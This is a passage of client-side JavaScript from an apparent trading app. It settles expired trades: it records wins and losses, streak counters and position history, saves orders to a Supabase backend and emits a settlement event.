        user.consecutiveWins = (user.consecutiveWins || 0) + 1;
        user.consecutiveLosses = 0;
        user.lastLost = false;
        D6.Store.addTransaction(user, {
          type: 'win',
          amount: payoutAmount,
          mode: mode,
          note: 'Position gagnante ' + C.ASSETS[trade.assetId].short
        });
      } else {
        status = 'lost';
        net = -trade.stake;
        user.consecutiveLosses = (user.consecutiveLosses || 0) + 1;
        user.consecutiveWins = 0;
        user.lastLost = true;
        D6.Store.addTransaction(user, {
          type: 'loss',
          amount: -trade.stake,
          mode: mode,
          note: 'Position expirée ' + C.ASSETS[trade.assetId].short
        });
      }

      trade.status = status;
      trade.closePrice = exitPrice;
      trade.exitPrice = exitPrice;
      // Historique mise pour anti-martingale (trade suivant).
      user.lastBetAmount = trade.stake;
      user.lastStake = trade.stake;

      user.trades = (user.trades || 0) + 1;
      if (mode === 'real') user.realTrades = (user.realTrades || 0) + 1;
      else user.demoTrades = (user.demoTrades || 0) + 1;
      user.recentResults.unshift({ won: won, mode: mode, voided: voided });
      if (user.recentResults.length > 30) user.recentResults.length = 30;

      var position = {
        id: trade.id,
        at: D6.nowIso(),
        clock: D6.clock(),
        assetId: trade.assetId,
        assetName: C.ASSETS[trade.assetId].short,
        side: trade.side,
        stake: trade.stake,
        payout: trade.payout,
        entryPrice: trade.entryPrice,
        exitPrice: exitPrice,
        closePrice: exitPrice,
        duration: trade.duration,
        won: won,
        voided: voided,
        status: status,
        net: net,
        mode: mode,
        accountType: mode
      };
      D6.Store.addPosition(user, position);
      trades.splice(idx, 1);
      persistOpen(user);
      if (D6.Supabase && D6.Supabase.saveOrder) {
        D6.Supabase.saveOrder({
          id: trade.id,
          assetId: trade.assetId,
          side: trade.side,
          stake: trade.stake,
          duration: trade.duration,
          mode: mode,
          payout: trade.payout,
          entryPrice: trade.entryPrice,
          exitPrice: exitPrice,
          won: won,
          voided: voided,
          status: status,
          net: net
        }, 'closed');
      }

      try {
        document.dispatchEvent(new CustomEvent('orolado-trade-settled', {
          detail: { isWin: won, voided: voided, payout: payoutAmount, net: net, tradeId: trade.id }
        }));
      } catch (e) { /* ignore */ }

      var closed = publicTrade(trade);
      if (!trades.filter(isLive).length) D6.holdRemote = false;
      return {
        trade: closed,
        position: position,
        won: won,
        voided: voided,
        net: net,
        exitPrice: exitPrice,
        closePrice: exitPrice,
        status: status
      };
    },

    flushSettlements: function (user) {
      if (!user || !trades.length) return [];
      var now = Date.now();
      var ids = [];
      var i;
      for (i = 0; i < trades.length; i++) {
        if (isOpen(trades[i]) && now >= expiryOf(trades[i])) ids.push(trades[i].id);
      }
      var results = [];
      for (i = 0; i < ids.length; i++) {
        var res = api.resolve(user, ids[i]);
        if (res) {
          results.push(res);
          if (typeof api.onSettled === 'function') {
            try { api.onSettled(res); } catch (e) { /* ignore */ }
          }
        }
      }
      return results;
    },

    maxStakeHint: function (user) {
      var probe = stakeCap(user, Number.MAX_SAFE_INTEGER, user && user.mode);
      return probe.cap;
    }
  };

  // Pas d’API publique nextPrice / seed / bougies futures.
  D6.Synth = {};

  D6.Engine = api;
  try {
    Object.defineProperty(D6, 'Engine', { configurable: false, writable: false, value: api });
  } catch (e) { /* ignore */ }
})(window.D6 = window.D6 || {});
